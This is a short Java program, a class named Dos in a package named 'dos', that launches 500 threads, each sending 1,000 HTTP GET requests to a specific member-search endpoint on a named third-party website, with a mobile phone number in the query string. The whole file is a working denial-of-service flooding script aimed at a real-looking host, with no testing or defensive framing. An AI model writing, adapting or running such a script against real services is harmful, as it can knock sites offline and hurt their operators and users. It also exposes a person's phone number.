package org.jd.j2se.test0.dos;

import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClientBuilder;

import java.io.ByteArrayOutputStream;
import java.io.IOException;

/**
 * Created by cuijiandong on 2018/8/20.
 */
public class Dos {
    public static void main(String[]a) throws IOException {

        for (int i2 = 0; i2 < 500; i2++) {
            new Thread(()->{
               try{
                   CloseableHttpClient c = HttpClientBuilder.create().build();
                   HttpGet get=new HttpGet("http://qwe.inren.cn/MemberCenter/user_search.asp?clientid=mobile&mobile=18678936799&m=member&c=user&a=public_checkmobile_ajax&_=1534758059069");
                   for (int i = 0; i < 1000; i++) {
                       CloseableHttpResponse resp = c.execute(get);
                       System.out.print(Thread.currentThread().getName()+"---"+i+"----");
                       ByteArrayOutputStream out=new ByteArrayOutputStream();
                       resp.getEntity().writeTo(out);
                       System.out.println(out.toString());

                   }
               }catch (Exception e){
                   e.printStackTrace();
               }
            }).start();
        }

    }
}
